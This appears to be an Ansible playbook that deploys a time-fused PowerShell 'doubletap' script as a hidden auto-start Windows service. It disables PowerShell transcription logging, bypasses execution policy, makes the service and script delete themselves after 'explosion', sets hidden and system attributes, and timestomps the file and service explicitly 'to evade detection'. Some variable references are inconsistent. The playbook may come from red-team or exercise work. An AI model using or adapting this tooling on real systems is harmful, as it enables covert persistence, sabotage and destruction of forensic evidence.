---
#- name: Define variables for paths and filenames
#  set_fact:
#    doubletap_ps1_service_script_dest: "C:\\Windows\\Temp\\firewall_script2.ps1"
#    doubletap_ps1_service_service_name: "DoubleTapScript"
#    doubletap_ps1_service_service_display_name: "DoubleTap Script"

- name: Disable PowerShell logging by modifying the registry
  win_registry:
    path: "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell"
    name: "EnableTranscripting"
    type: dword
    data: "0"
    state: present
    
- name: Copy PowerShell script to target
  win_copy:
    src: "files/doubletap.ps1"
    dest: "{{ doubletap_ps1_service_script_dest }}"

- name: Create Windows Service to Run PowerShell Script
  win_service:
    name: "{{ doubletap_ps1_service_service_name }}"
    display_name: "{{ doubletap_ps1_service_service_display_name }}"
    bin_path: "powershell.exe -ExecutionPolicy Bypass -File {{ doubletap_ps1_service_script_dest }}"
    startup: "automatic"
    state: "started"

- name: Update settings in the script file
  replace:
    path: "{{ doubletap_ps1_loop_script_dest }}"
    regexp: |
      ^(\$fuse_date\s*=\s*).*|^(\$fuse_time\s*=\s*).*|^(\$fuse_armed\s*=\s*).*|^(\$log_location\s*=\s*).*
    replace: |
      $fuse_date ="{{ doubletap_fuse_date }}" # In format YYYY-MM-DD in America/New_York timezone
      $fuse_time = "{{ doubletap_fuse_time }}" # In format HH:MM:SS, using 24h time in America/New_York timezone
      $fuse_armed = ${{ doubletap_fuse_armed }} # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE
      $log_location = "{{ doubletap_ps1_service_log_path }}" # Set to /dev/null for no output (and comment out line 14)

- name: Modify PowerShell script to self-delete service after execution
  win_lineinfile:
    path: "{{ doubletap_ps1_service_script_dest }}"
    line: 'Stop-Service -Name "{{ doubletap_ps1_service_service_name }}" -Force; Remove-Service -Name "{{ doubletap_ps1_service_service_name }}"'
    insertafter: "# Cleanup after explosion"

- name: Add script deletion at the end of the PowerShell script
  win_lineinfile:
    path: "{{ doubletap_ps1_service_script_dest }}"
    line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
    insertafter: 'Log " My work here is done"''

- name: Apply hidden and system attributes to the PowerShell script
  win_shell: |
    attrib +h +s "{{ doubletap_ps1_service_script_dest }}"

- name: Timestomp script and task to evade detection
  win_shell: |
    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
    (Get-Item "{{ doubletap_ps1_service_script_dest }}").CreationTime = $time
    (Get-Item "{{ doubletap_ps1_service_script_dest }}").LastWriteTime = $time
    (Get-Item "{{ doubletap_ps1_service_script_dest }}").LastAccessTime = $time
  args:
    executable: powershell.exe

- name: Timestomp the Service to evade detection
  win_shell: |
    $service = Get-WmiObject -Class Win32_Service -Filter "Name='{{ doubletap_ps1_service_service_name }}'"
    if ($service) {
        $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
        $service.CreationDate = $time
        $service.StartMode = "Manual" # Optionally change the service start mode
    }
  args:
    executable: powershell.exe